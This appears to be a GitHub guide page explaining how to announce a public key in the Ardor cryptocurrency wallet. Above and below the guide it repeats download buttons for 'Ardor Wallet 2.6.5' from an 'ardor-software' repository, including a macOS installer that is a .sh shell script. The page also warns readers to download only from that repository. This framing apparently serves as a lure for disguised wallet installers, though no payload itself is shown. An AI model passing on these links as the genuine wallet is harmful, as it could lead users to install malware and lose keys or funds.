![Ardor Wallet guide](assets/banner-article.png)

# Announce a public key in the Ardor wallet

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

Announcing a public key records it on the blockchain, and the wallet does it with an ordinary outgoing transaction or with a receiving transaction that carries the recipient's public key. It matters most for accounts that have sat idle with a balance, because an account whose key was never recorded is identified only by a shorter account ID.

## What announcing actually does

Every account has a public key derived from its secret. The chain does not necessarily know that key until a transaction reveals it, and until then the [Ardor account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) is referenced by a shortened identifier.

Announcing writes the full key into the [Ardor chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md)'s records, after which transactions for that account must be signed by the matching private key. The shortened identifier stops being the thing that defines the account, and a different secret that happens to map to the same short ID can no longer act as it.

## When it matters

The case that gets attention is an account funded before it ever sent anything, especially one that arrived from an older chain with a [balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md) already in it. Nothing has gone wrong yet, and the exposure is theoretical rather than active - but it is the one gap a holder can close for the price of a single transaction.

The second case is a migration. An account that sat untouched for years and then reappeared on a new chain is exactly the profile that benefits, because the balance is real, the history is thin and the key may never have been recorded.

## How to announce it

1. Open the wallet and unlock the account on the [Ardor passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md) tab.
2. Confirm the account holds enough for a transaction fee on the parent chain.
3. Use the account's public key control and choose to announce it.
4. Sign and send the transaction, then wait for it to confirm.
5. Check the account's details afterwards; the key should now be listed as known.

The alternative route works without spending from the account: another account sends a small amount to it, including the recipient's public key in the transaction. That is useful for an account you would rather not touch, and it achieves the same result.

## Exporting a key is not announcing it

The wallet can also show or export the private key for an account. That is a different operation with a different risk profile: it does not record anything on chain, and it puts the secret on screen, in a clipboard, or into a file.

Exporting is for a specific recovery situation on a machine you control. It is not a safety step, it does not protect an idle account, and it should never be done because a website asked for it. Announcing is the protective action; exporting is the emergency one.

## What it does not protect against

Announcement closes one gap and leaves the others exactly as they were. It does not stop a leaked passphrase, it does not stop clipboard malware from changing a recipient address, and it does not recover anything already lost.

It also does not change the address or the secret. The account stays the same; the difference is in what the chain records about it.

Think of it as closing one specific gap rather than raising a general shield. An announced key does nothing about a phrase in a photograph, and it does nothing about a machine that logs keystrokes, which is why it is one line in a checklist rather than the checklist itself.

## Why the shortened account ID exists

Accounts are derived from secrets, and a full public key is long. To keep addresses readable, the chain refers to accounts by a shortened identifier computed from the key, which is what the grouped address format shows.

That shortening is a convenience with a cost: two different keys can, in principle, produce the same short identifier, and until a key is announced the chain has no way to tell which one an account belongs to. Announcement removes the ambiguity by recording the full key, and from that point the shortened form is just a label for something the chain already knows.

## Doing it at the right moment

The cheapest time is immediately after an account receives its first funds, before it has any history to reason about. The second cheapest is now, whatever the account's age, because the fee is trivial and the alternative is carrying an avoidable exposure for as long as the balance sits there.

If you are unsure whether an account needs it, look at its details in the wallet. An account with no announced key is visible as such, and the decision takes a second rather than a research project.

## FAQ

### Does announcing a public key cost anything?

One transaction fee, because the key is recorded by a transaction. A receiving transaction that carries the key achieves the same result without the account spending.

### Can I announce a key for an account I only watch?

No. Announcing requires a signature, and a watched address has no key available to sign with.

### Does it change my address?

No. The address and the secret stay the same; the chain simply records the public key that belongs to them.

### Should I announce the key on every account?

It is worth it on any account that holds a balance and has never sent a transaction, and on any account that arrived from an older chain with funds already in it.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Can an Ardor wallet be hacked? What actually happens](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-an-ardor-wallet-be-hacked.md)
- [Is the Ardor wallet safe? What to check and what to avoid](https://github.com/ardor-software/ardor-wallet-guides/blob/main/is-the-ardor-wallet-safe.md)
- [What happened to the Nxt chain, and where the token is now](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-happened-to-the-nxt-chain-on-ardor.md)
- [Create an Ardor account and read its address](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
